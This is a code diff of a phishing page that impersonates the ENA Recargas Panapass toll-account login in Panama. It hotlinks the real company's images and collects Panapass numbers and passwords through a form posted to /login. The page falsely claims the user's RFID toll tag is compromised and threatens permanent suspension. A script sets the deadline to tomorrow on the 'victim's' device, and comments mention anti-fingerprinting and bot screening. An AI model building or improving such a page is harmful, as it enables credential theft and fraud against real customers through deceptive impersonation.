@@ -7,39 +7,74 @@
     <meta name="robots" content="noindex, nofollow">
     <title>ENA Recargas - Login</title>
     <style>
-        /* Full-screen responsive background image */
-        body {
-            background-image: url('/static/background.jpg');  /* Corrected path for Flask static folder */
-            background-size: cover;  /* Covers the entire screen, scales responsively */
-            background-position: center;  /* Centers the image */
-            background-repeat: no-repeat;  /* No tiling */
-            background-attachment: scroll;  /* Keeps it fixed during scrolling (optional, remove if you want it to scroll) */
+        html, body {
+            height: 100vh;
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
             color: #172c33;
-            min-height: 100vh;  /* Ensures it covers full height on mobile */
+            background-color: #f4f4f4;
         }
-        .header {
-            background-color: transparent;  /* Make header background transparent to show image */
-            color: white;
-            padding: 10px;
-            text-align: center;
+        body {
+            display: flex;
+            flex-direction: column;
         }
-        .header img {
-            width: 30%;
-            height: auto;
-            max-width: 150px;  /* Prevent logo from being too big on small screens */
+        .banner {
+            background-color: #20364b;  /* Much darker blue */
+            padding: max(15px, env(safe-area-inset-top)) 20px 15px 20px;  /* Safe area for top */
+            width: 100%;
+            position: fixed;
+            top: 0;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+        }
+        .banner img {
+            height: 50px;
+            margin-left: 20px;
+        }
+        .main-container {
+            display: flex;
+            width: 100%;
+            height: calc(100vh - 80px - env(safe-area-inset-top));  /* Adjust for safe area */
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            margin-top: calc(80px + env(safe-area-inset-top));  /* Adjust for safe area */
+            position: relative;
+        }
+        .image-section {
+            width: 100%;  /* Full width */
+            height: 100%;
+            background-image: url('https://www.enarecargas.com/maxipista/VAADIN/themes/privatetheme/img/imgPanapass.jpg');
+            background-size: cover;  /* Changed to cover to fill more vertically */
+            background-position: 0% 50%;  /* Moved significantly more closer to the form */
+            background-repeat: no-repeat;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        .form-section {
+            position: absolute;
+            right: 0;  /* Maintained position */
+            top: 0;
+            width: 400px;  /* Increased horizontally */
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: flex-end;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.95);  /* Semi-transparent to mix with image */
         }
         .login-container {
-            max-width: 400px;
-            margin: 50px auto;  /* Keeps it centered */
-            background: rgba(255, 255, 255, 0.6);  /* Reduced transparency (was 0.9) for smoother image visibility */
-            padding: 20px;
-            border-radius: 8px;
+            width: 100%;
+            max-width: 500px;  /* Increased significantly for horizontal fill */
+            background: rgba(255, 255, 255, 0.9);  /* Semi-transparent */
+            padding: 15px;
+            border-radius: 0px;  /* Sharp corners */
             box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            width: 90%;  /* Responsive width */
-            box-sizing: border-box;
+            /* Removed border for no black at corners */
+            /* Removed max-height and overflow to show full form including button */
         }
         .form-group {
             margin-bottom: 15px;
@@ -53,9 +88,10 @@
             width: 100%;
             padding: 10px;
             border: 1px solid #ccc;
-            border-radius: 4px;
+            border-radius: 0px;  /* Sharp corners */
+            background-color: lightblue;  /* Light blue inside */
             color: black;
-            font-size: 16px;  /* Prevents zoom on mobile focus */
+            font-size: 16px;
             box-sizing: border-box;
         }
         button {
@@ -71,11 +107,15 @@
         button:hover {
             background-color: #1f3043;
         }
-        .footer {
+        .bottom-footer {
             text-align: center;
-            margin-top: 20px;
             font-size: 12px;
             color: #666;
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            white-space: nowrap;
         }
         .urgency-alert {
             background-color: #ffdddd;
@@ -90,14 +130,82 @@
         .honeypot {
             display: none;
         }
-        /* Mobile-specific styles */
-        @media (max-width: 768px) {
-            .login-container {
-                margin: 20px auto;
-                padding: 15px;
+        /* Tablet-specific styles (768px to 1024px) */
+        @media (min-width: 769px) and (max-width: 1024px) {
+            .banner {
+                padding: max(12px, env(safe-area-inset-top)) 15px 12px 15px;
             }
-            .header img {
-                width: 50%;
+            .banner img {
+                height: 45px;
+                margin-left: 15px;
+            }
+            .main-container {
+                height: calc(100vh - 70px - env(safe-area-inset-top));
+                margin-top: calc(70px + env(safe-area-inset-top));
+            }
+            .image-section {
+                width: 60%;  /* Show image on tablet */
+                background-position: center center;
+            }
+            .form-section {
+                width: 40%;
+                position: static;
+                align-items: center;
+                padding: 15px;
+                background: rgba(255, 255, 255, 0.95);
+            }
+            .login-container {
+                max-width: 100%;
+                padding: 20px;
+            }
+            .bottom-footer {
+                position: static;
+                margin-top: 20px;
+                transform: none;
+            }
+        }
+        /* Mobile-specific styles (up to 768px) */
+        @media (max-width: 768px) {
+            html, body {
+                height: auto;  /* Allow scrolling on mobile */
+                overflow: visible;
+            }
+            .banner {
+                padding: max(10px, env(safe-area-inset-top)) 15px 10px 15px;
+            }
+            .banner img {
+                height: 40px;
+                margin-left: 10px;
+            }
+            .main-container {
+                flex-direction: column;
+                margin-top: calc(60px + env(safe-area-inset-top));
+                height: auto;  /* Allow content to expand */
+                min-height: calc(100vh - 60px - env(safe-area-inset-top));
+            }
+            .image-section {
+                display: none;  /* Hide image on mobile */
+            }
+            .form-section {
+                position: static;
+                align-items: center;
+                padding: 10px;
+                width: 100%;
+                background: white;
+                height: auto;
+            }
+            .login-container {
+                max-width: none;
+                width: 90%;
+                margin: 0 auto;
+                padding: 20px;
+                background: white;
+                border-radius: 8px;  /* Slight rounding on mobile for better UX */
+            }
+            .bottom-footer {
+                position: static;
+                margin-top: 20px;
+                transform: none;
             }
             .urgency-alert {
                 font-size: 14px;
@@ -107,43 +215,48 @@
     </style>
 </head>
 <body>
-    <div class="header">
+    <div class="banner">
         <img src="https://www.enarecargas.com/maxipista/VAADIN/themes/privatetheme/img/logoEna.jpg" alt="ENA Logo">
     </div>
-
-    <!-- Randomized class for anti-fingerprinting -->
-    <div class="login-container" id="dynamic-container">
-        <div class="urgency-alert" id="urgencyMessage">
-            ¡Verificación Obligatoria! Debido a actualizaciones de seguridad, inicia sesión para verificar tu cuenta antes del [fecha] o tu saldo prepago será suspendido temporalmente.
+    <div class="main-container">
+        <div class="image-section">
+            <!-- Image is set as background in CSS -->
         </div>
-        <h2>Iniciar Sesión</h2>
-        <form action="/login" method="POST">
-            <div class="form-group">
-                <label for="panapass">Nº Panapass*</label>
-                <input type="text" id="panapass" name="panapass" required>
+        <div class="form-section">
+            <!-- Randomized class for anti-fingerprinting -->
+            <div class="login-container" id="dynamic-container">
+                <div class="urgency-alert" id="urgencyMessage">
+                    ¡Verificación Obligatoria! Su etiqueta RFID de peaje está comprometida y ha sido desactivada temporalmente. Inicie sesión para verificar su cuenta antes del [fecha] o su cuenta será suspendida permanentemente.
+                </div>
+                <h2>Iniciar Sesión</h2>
+                <form action="/login" method="POST">
+                    <div class="form-group">
+                        <label for="panapass">Nº Panapass*</label>
+                        <input type="text" id="panapass" name="panapass" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Contraseña*</label>
+                        <input type="password" id="password" name="password" required>
+                    </div>
+                    <!-- Honeypot field: Crawlers/bots might fill this; check in backend -->
+                    <div class="honeypot">
+                        <label for="website">Sitio Web</label>
+                        <input type="text" id="website" name="website">
+                    </div>
+                    <button type="submit">identificarse</button>
+                </form>
             </div>
-            <div class="form-group">
-                <label for="password">Contraseña*</label>
-                <input type="password" id="password" name="password" required>
-            </div>
-            <!-- Honeypot field: Crawlers/bots might fill this; check in backend -->
-            <div class="honeypot">
-                <label for="website">Sitio Web</label>
-                <input type="text" id="website" name="website">
-            </div>
-            <button type="submit">identificarse</button>
-        </form>
+        </div>
     </div>
-
-    <div class="footer">
-        <p>Transacción Segura | Contacto: 800-ENA</p>
+    <div class="bottom-footer">
+        Ena - Empresa Nacional de Autopista, S.A. (v1.18). Ciudad de Panamá, Panamá.
     </div>
 
     <script>
         // Dynamic date detection using victim's local device time
-        // Detects current date on victim's phone/computer and calculates tomorrow's date (includes month)
+        // Detects current date on victim's device and calculates tomorrow's date (includes month)
         (function() {
-            var today = new Date();  // Gets current date on victim's device
+            var today = new Date();  /* Gets current date on victim's device */
             var tomorrow = new Date(today);
             tomorrow.setDate(today.getDate() + 1);  // Calculate tomorrow's date
 
